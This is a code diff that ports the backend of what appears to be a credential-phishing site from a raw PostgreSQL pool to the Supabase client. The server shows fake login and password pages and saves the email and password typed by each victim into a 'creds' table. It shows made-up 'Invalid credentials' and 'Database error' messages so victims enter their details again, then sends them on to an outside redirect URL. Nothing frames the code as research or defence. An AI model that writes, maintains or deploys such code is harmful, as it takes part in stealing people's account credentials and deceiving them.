@@ -1,8 +1,9 @@
 const path = require('path');
+require('dotenv').config();
 const express = require('express');
 const cookieParser = require('cookie-parser');
 const crypto = require('crypto');
-const { Pool } = require('pg');
+const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -21,51 +22,32 @@ app.use(express.urlencoded({ extended: true }));
 app.use(cookieParser());
 
 // Supabase PostgreSQL database connection
-// Use connection string if provided, otherwise use individual connection parameters
-const pool = process.env.SUPABASE_DB_URL 
-  ? new Pool({
-      connectionString: process.env.SUPABASE_DB_URL,
-      ssl: {
-        rejectUnauthorized: false // Supabase requires SSL
-      }
-    })
-  : new Pool({
-      host: process.env.SUPABASE_HOST || process.env.DB_HOST,
-      port: process.env.SUPABASE_PORT || process.env.DB_PORT || 5432,
-      database: process.env.SUPABASE_DB || process.env.DB_NAME,
-      user: process.env.SUPABASE_USER || process.env.DB_USER,
-      password: process.env.SUPABASE_PASSWORD || process.env.DB_PASSWORD,
-      ssl: {
-        rejectUnauthorized: false // Supabase requires SSL
-      }
-    });
+const supabaseUrl = process.env.SUPABASE_URL;
+const supabaseKey = process.env.SUPABASE_KEY;
+const supabase = createClient(supabaseUrl, supabaseKey);
 
 // Initialize database table
-(async () => {
-  try {
-    await pool.query(
-      `CREATE TABLE IF NOT EXISTS creds (
-        id SERIAL PRIMARY KEY,
-        email VARCHAR(255) NOT NULL,
-        password VARCHAR(255) NULL,
-        session_id VARCHAR(255) NULL,
-        session_expires_at TIMESTAMP NULL,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-      )`
-    );
-    await pool.query(
-      `CREATE TABLE IF NOT EXISTS session_count (
-        id SERIAL PRIMARY KEY,
-        session_id VARCHAR(255) NOT NULL,
-        count INT NOT NULL,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-      )`
-    )
-    console.log('Database table ready');
-  } catch (err) {
-    console.error('Error creating table', err);
-  }
-})();
+/*
+// Initialize database table
+// Tables 'creds' and 'session_count' should be created in the Supabase dashboard or via SQL Editor.
+// Automatic creation logic removed as Supabase JS client is for DML.
+
+CREATE TABLE IF NOT EXISTS creds (
+  id SERIAL PRIMARY KEY,
+  email VARCHAR(255) NOT NULL,
+  password VARCHAR(255) NULL,
+  session_id VARCHAR(255) NULL,
+  session_expires_at TIMESTAMP NULL,
+  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+CREATE TABLE IF NOT EXISTS session_count (
+  id SERIAL PRIMARY KEY,
+  session_id VARCHAR(255) NOT NULL,
+  count INT NOT NULL,
+  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+*/
 
 // Helper function to generate unique session ID
 function generateSessionId() {
@@ -75,15 +57,16 @@ function generateSessionId() {
 // Helper function to check if session is valid
 async function isValidSession(sessionId) {
   if (!sessionId) return false;
-  
+
   try {
-    const result = await pool.query(
-      'SELECT * FROM session_count WHERE session_id = $1',
-      [sessionId]
-    );
-    
-    if (result.rows.length === 0) return false;
-    
+    const { data, error } = await supabase
+      .from('session_count')
+      .select('*')
+      .eq('session_id', sessionId);
+
+    if (error) throw error;
+    if (!data || data.length === 0) return false;
+
     return true;
   } catch (err) {
     console.error('Error checking session', err);
@@ -96,12 +79,12 @@ app.get('/login', async (req, res) => {
   let sessionId = req.cookies.sessionId;
   console.log("login get session id:", sessionId)
   const isCheckedIn = await isValidSession(sessionId);
-  if(!isCheckedIn){
+  if (!isCheckedIn) {
     sessionId = generateSessionId()
     res.cookie('sessionId', sessionId, {
       maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
     });
-    await pool.query('INSERT INTO session_count (session_id, count) VALUES ($1, $2)', [sessionId, 1]);
+    await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
   }
 
   res.render('login', {
@@ -118,34 +101,49 @@ app.post('/login', async (req, res) => {
   if (!email || !email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
     return res.redirect('/login?error=Invalid+email');
   }
-  try{
+  try {
     let sessionId = req.cookies.sessionId;
     console.log("login post session id:", sessionId)
     const isCheckedIn = await isValidSession(sessionId);
-    if(!isCheckedIn){
+    if (!isCheckedIn) {
       sessionId = generateSessionId();
       res.cookie('sessionId', sessionId, {
         maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
       });
-      await pool.query('INSERT INTO session_count (session_id, count) VALUES ($1, $2)', [sessionId, 1]);
+      await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
     }
 
-    let sessionCount = await pool.query('SELECT count FROM session_count WHERE session_id = $1', [sessionId]);
-    console.log(sessionCount)
-    sessionCount = sessionCount.rows[0].count;
-    if(sessionCount % 3 === 1){
-      let result = await pool.query('UPDATE session_count SET count = $1 WHERE session_id = $2 ', [sessionCount+1 ,sessionId])
-      console.log(result)
-      console.log("New updated count:", sessionCount+1)
+    let { data: sessionCountData, error: countError } = await supabase
+      .from('session_count')
+      .select('count')
+      .eq('session_id', sessionId)
+      .single();
+
+    if (countError) throw countError;
+
+    let sessionCount = sessionCountData.count;
+    if (sessionCount % 3 === 1) {
+      const { error: updateError } = await supabase
+        .from('session_count')
+        .update({ count: sessionCount + 1 })
+        .eq('session_id', sessionId);
+      if (updateError) throw updateError;
+
+      console.log("New updated count:", sessionCount + 1)
       return res.redirect('/login?error=Invalid+credentials');
-    }else if (sessionCount % 3 === 2){
-      await pool.query('UPDATE session_count SET count = $1 WHERE session_id = $2', [sessionCount+1, sessionId])
-      console.log("New updated count:", sessionCount+1)
+    } else if (sessionCount % 3 === 2) {
+      const { error: updateError } = await supabase
+        .from('session_count')
+        .update({ count: sessionCount + 1 })
+        .eq('session_id', sessionId);
+      if (updateError) throw updateError;
+
+      console.log("New updated count:", sessionCount + 1)
       return res.redirect('/login?error=Database+error')
-    }else {
-      await pool.query('INSERT INTO creds (email, session_id) VALUES ($1, $2)', [email, sessionId])
-      await pool.query('UPDATE session_count SET count = $1 WHERE session_id = $2', [1, sessionId])
-      console.log("New updated count:", sessionCount+1)
+    } else {
+      await supabase.from('creds').insert([{ email: email, session_id: sessionId }]);
+      await supabase.from('session_count').update({ count: 1 }).eq('session_id', sessionId);
+      console.log("New updated count:", sessionCount + 1)
       return res.redirect('/login/password')
     }
   } catch (err) {
@@ -157,11 +155,20 @@ app.post('/login', async (req, res) => {
 app.get('/login/password', async (req, res) => {
   const sessionId = req.cookies.sessionId;
   const isCheckedIn = await isValidSession(sessionId);
-  if(!isCheckedIn){
+  if (!isCheckedIn) {
     return res.redirect('/login')
   }
-  let email = await pool.query('SELECT email FROM creds WHERE session_id = $1', [sessionId]);
-  email = email.rows[0].email
+  let { data: emailData, error: emailError } = await supabase
+    .from('creds')
+    .select('email')
+    .eq('session_id', sessionId)
+    .single();
+
+  if (emailError) {
+    console.error(emailError);
+    return res.redirect('/login');
+  }
+  let email = emailData.email;
 
   res.render('password', {
     sessionId: sessionId,
@@ -173,25 +180,32 @@ app.get('/login/password', async (req, res) => {
 
 app.post('/login/password', async (req, res) => {
   const { password } = req.body;
-  
-  try{
+
+  try {
     let sessionId = req.cookies.sessionId;
     const isCheckedIn = await isValidSession(sessionId);
-    if(!isCheckedIn){
+    if (!isCheckedIn) {
       return res.redirect('/login')
     }
 
-    let sessionCount = await pool.query('SELECT count FROM session_count WHERE session_id = $1', [sessionId]);
-    sessionCount = sessionCount.rows[0].count;
-    if(sessionCount % 3 === 1){
-      await pool.query('UPDATE session_count SET count = $2 WHERE session_id = $1 ', [sessionId, sessionCount+1])
+    let { data: sessionCountData, error: countError } = await supabase
+      .from('session_count')
+      .select('count')
+      .eq('session_id', sessionId)
+      .single();
+
+    if (countError) throw countError;
+    let sessionCount = sessionCountData.count;
+
+    if (sessionCount % 3 === 1) {
+      await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
       return res.redirect('/login/password?error=Invalid+credentials');
-    }else if (sessionCount % 3 === 2){
-      await pool.query('UPDATE session_count SET count = $2 WHERE session_id = $1', [sessionId, sessionCount+1])
+    } else if (sessionCount % 3 === 2) {
+      await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
       return res.redirect('/login/password?error=Database+error')
-    }else {
-      await pool.query('UPDATE creds SET password = $2 WHERE session_id = $1', [sessionId, password])
-      await pool.query('DELETE FROM session_count WHERE session_id = $1', [sessionId])
+    } else {
+      await supabase.from('creds').update({ password: password }).eq('session_id', sessionId);
+      await supabase.from('session_count').delete().eq('session_id', sessionId);
       return res.redirect(process.env.REDIRECT_URL)
     }
   } catch (err) {
@@ -200,7 +214,7 @@ app.post('/login/password', async (req, res) => {
   }
 });
 
-app.use((req, res)=> {
+app.use((req, res) => {
   res.redirect(process.env.MAIN_REDIRECT_URL)
 })
 
